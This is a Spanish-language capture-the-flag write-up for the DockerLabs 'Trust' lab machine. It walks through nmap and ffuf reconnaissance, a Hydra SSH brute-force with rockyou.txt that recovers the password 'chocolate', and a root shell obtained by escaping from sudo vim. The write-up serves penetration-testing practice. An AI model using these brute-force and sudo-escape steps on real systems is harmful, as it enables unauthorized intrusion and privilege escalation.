Writeup: Máquina "Trust" de DockerLabs
Una guía paso a paso del proceso de auditoría y compromiso total (de usuario a root) de la máquina Trust.

1. Fase de Reconocimiento
Paso A: Comprobación de conectividad (Ping)
En primer lugar, verificamos la conectividad con la máquina objetivo mediante un ping.

Bash
ping -c 4 172.17.0.2
Nota de análisis: La respuesta del ping muestra un TTL (Time to Live) de 64 (o muy cercano), lo que nos indica que el sistema operativo de la máquina víctima es Linux.

Paso B: Escaneo de puertos (Nmap)
Realizamos un escaneo rápido con nmap para identificar qué puertos y servicios están expuestos en el objetivo.

Bash
nmap 172.17.0.2
Resultado del escaneo:

Puerto 22/tcp (Open): Servicio SSH activo.

Puerto 80/tcp (Open): Servicio HTTP (Servidor Web) activo.

2. Enumeración Web (Fuzzing de Directorios)
Al ver que el puerto 80 está abierto y muestra la página por defecto de Apache (lo que genera un falso positivo de tamaño 10701 bytes), ejecutamos un escaneo de directorios con ffuf filtrando ese tamaño específico e indicando extensiones de archivo comunes.

Comando de Fuzzing:
Bash
ffuf -u http://172.17.0.2/FUZZ -w /usr/share/wordlists/dirb/common.txt -fs 10701 -e .html,.php,.txt -r -v
Explicación del comando:
-u http://172.17.0.2/FUZZ: Especifica la URL objetivo, reemplazando la palabra FUZZ con el diccionario.

-w .../common.txt: Ruta del diccionario utilizado.

-fs 10701: Filtra y oculta las respuestas cuyo tamaño sea de 10701 bytes (evitando el ruido de la página por defecto).

-e .html,.php,.txt: Crucial. Fuerza la búsqueda de archivos con estas extensiones específicas.

-r: Sigue las redirecciones automáticas.

-v: Modo detallado (verbose).

Resultado del Fuzzing:
Se descubre la ruta oculta secret.php. Al acceder a ella desde el navegador, se visualiza el texto:

"hola mario"

Esto nos revela un nombre de usuario potencial para el sistema: mario.

3. Intrusión (Fuerza Bruta a SSH)
Teniendo el usuario legítimo (mario) y el puerto SSH (22) abierto, utilizamos Hydra junto con el diccionario rockyou.txt para encontrar la contraseña de acceso.

Comando de Hydra:
Bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -v
Explicación del comando:
-l mario: Define el usuario objetivo.

-P .../rockyou.txt: Carga el diccionario de contraseñas más utilizado en el ámbito del pentesting.

-t 4: Limita los hilos a 4 en paralelo. Esto evita saturar el puerto 22 y previene errores de tipo Connection reset by peer.

-v: Modo verbose, muestra los intentos en tiempo real.

Credencial Obtenida:
Usuario: mario

Contraseña: chocolate

Acceso Inicial:
Nos conectamos de forma segura mediante SSH a la máquina víctima:

Bash
ssh mario@172.17.0.2
Introducimos la contraseña chocolate y ganamos acceso al sistema como el usuario local.

4. Escalada de Privilegios (De Mario a Root)
Una vez dentro del sistema, el primer paso obligado es comprobar nuestros privilegios sudo actuales.

Comando:
Bash
sudo -l
Salida del comando:
Fragmento de código
mario@7e140299d80a:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 7e140299d80a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 7e140299d80a:
    (ALL) /usr/bin/vim
El resultado nos indica que el usuario mario puede ejecutar el editor de texto /usr/bin/vim como root sin restricciones.

Explotación de Vim (Escape de Consola):
Iniciamos Vim utilizando privilegios de administrador:

Bash
sudo vim
Una vez que el editor interactivo de Vim se abre en pantalla, aprovechamos su capacidad para ejecutar comandos del sistema e invocar una consola. Escribimos dentro de Vim:

Fragmento de código
:shell
Al presionar Enter, el proceso hijo hereda los privilegios de sudo de Vim, abriéndonos una terminal con el nivel más alto de administración.

Confirmación de Privilegios:
Bash
root@7e140299d80a:/usr/bin# whoami
root
¡Máquina completamente comprometida! Hemos obtenido acceso como el usuario root.
